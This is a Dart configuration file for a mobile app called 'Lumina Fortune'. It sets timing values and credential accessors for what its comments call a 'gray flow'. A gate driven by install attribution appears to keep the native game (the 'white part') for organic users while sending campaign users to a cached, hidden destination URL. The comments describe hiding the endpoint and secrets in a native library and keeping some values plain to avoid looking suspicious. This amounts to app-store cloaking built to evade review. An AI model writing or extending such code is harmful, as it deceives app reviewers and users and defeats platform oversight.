import 'sealed_bytes.dart';

// ─────────────────────────────────────────────────────────────
// PRISM SETTINGS — single source of truth for the gray flow.
// ─────────────────────────────────────────────────────────────
// Public identity values (bundle id, market id, display name) are
// visible in the store listing anyway, so they ride as plain
// constants — hiding them would look more suspicious than the
// value they'd protect. Every credential / endpoint / UA fragment
// is resolved lazily through `unseal*` accessors in
// `sealed_bytes.dart` so no plaintext credential lives as a Dart
// string literal in the compiled binary.
// ─────────────────────────────────────────────────────────────

abstract final class PrismSettings {
  PrismSettings._();

  // ── Public identity (matches store listing) ─────────────────
  static const String bundleId = 'com.luminafortune.luminagame';
  static const String storeToken = 'com.luminafortune.luminagame';
  static const String labelText = 'Lumina Fortune';
  static const String appTag = 'LuminaFortune';

  /// Numeric iOS App Store id. Empty on Android-only builds.
  static const String iosNumericId = '';

  // ── Timing constants ────────────────────────────────────────
  // Numeric literals survive `--obfuscate`, so each one here is
  // tuned independently per app.

  /// Snooze after a "Skip" tap on the push-invite screen.
  /// Range 172_800..604_800. Picked: 2 d — invite resurfaces at
  /// exactly 48 h from the Skip tap (2*86_400 = 172_800).
  static const int inviteSnoozeSeconds = 172_800;

  /// Delay before rescuing an initial `af_status: Organic`.
  /// Range 3..12 s. Tightened to 4 — the GCD rescue is itself
  /// time-boxed and the completer exits as soon as the real
  /// Non-organic callback lands, so a longer pre-roll just idled
  /// the warmup screen without improving attribution.
  static const int organicRescueSeconds = 4;

  /// POST timeout for the ruling endpoint. Range 10..25 s.
  static const int rulingTimeoutSeconds = 14;

  /// First-launch install-conversion wait. Range 8..20 s.
  /// Warmup total budget is 10..15 s per QA. The completer gates
  /// are early-exit (fire the moment AF conversion fills the
  /// campaign row), so this is purely the safety cap for a slow
  /// AppsFlyer server round-trip. Keep <= 10 to preserve the
  /// user-facing budget.
  static const int firstLaunchAwaitSeconds = 10;

  /// Returning-launch install-conversion wait. Range 2..6 s.
  static const int returningAwaitSeconds = 3;

  /// UDL / deep-link wait. Range 2..6 s.
  static const int deepLinkAwaitSeconds = 3;

  /// DNS probe timeout. 3 s covers VPN tunnels and still fits
  /// the 10..15 s warmup budget — a longer probe idles the
  /// loading bar while the kernel's own DNS retry already
  /// handles transient resolver hiccups.
  static const int dnsProbeSeconds = 3;

  /// Debounce before a live connectivity drop routes to no-link.
  /// Range 500..1_200 ms.
  static const int dropDebounceMs = 940;

  /// Bounded main-frame redirect-loop retries. Keep small.
  static const int redirectRetryBudget = 3;

  /// Freshness window of the cached destination URL. 3..14 days.
  static const int cacheLifetimeSeconds = 6 * 24 * 60 * 60;

  // ── Resolved (sealed) credentials ───────────────────────────
  // The relay endpoint + shared secret live ONLY inside
  // libprism_core.so (the native `pr_route` caller uses them); Dart
  // never resolves the endpoint and never performs the POST itself.
  static String get attributionKey => unsealAttributionKey();
  static String get messagingProject => unsealMessagingProject();

  static String get storeId {
    if (iosNumericId.isNotEmpty) return 'id$iosNumericId';
    return storeToken;
  }

  /// The gray gate stays disabled — every install lands directly
  /// in the native game — until the native relay library is loaded
  /// AND both attribution credentials decode non-empty. This lets
  /// QA smoke-test the white part before credentials are packed,
  /// and fails safe on any device where the `.so` is missing.
  static bool get gateReady =>
      prismNativeReady &&
      attributionKey.isNotEmpty &&
      messagingProject.isNotEmpty;
}
